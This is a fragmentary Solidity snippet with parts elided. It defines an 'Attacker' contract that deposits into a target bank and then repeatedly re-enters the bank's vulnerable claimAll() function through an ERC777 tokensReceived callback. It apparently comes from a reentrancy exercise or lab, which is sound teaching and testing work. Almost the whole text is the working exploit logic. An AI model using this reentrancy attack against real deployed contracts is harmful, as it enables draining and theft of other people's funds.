...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
	function attack(uint256 amt) payable public {
      require( address(bank) != address(0), "Target bank not set" );
			...
			//First call the deposit() function
    	bank.deposit{value: amt}();

    	// Call the vulnerable claimAll function to trigger eentrancy attack
    	bank.claimAll();
	}
	...
	*/
	function tokensReceived(
		...
		// Limit the depth of recursion to prevent infinite loops
    if (depth < max_depth) {
        depth++;  // Increase the recursion depth
        emit Recurse(depth);
        // Re-enter the claimAll function to trigger the attack again
        bank.claimAll();
	}
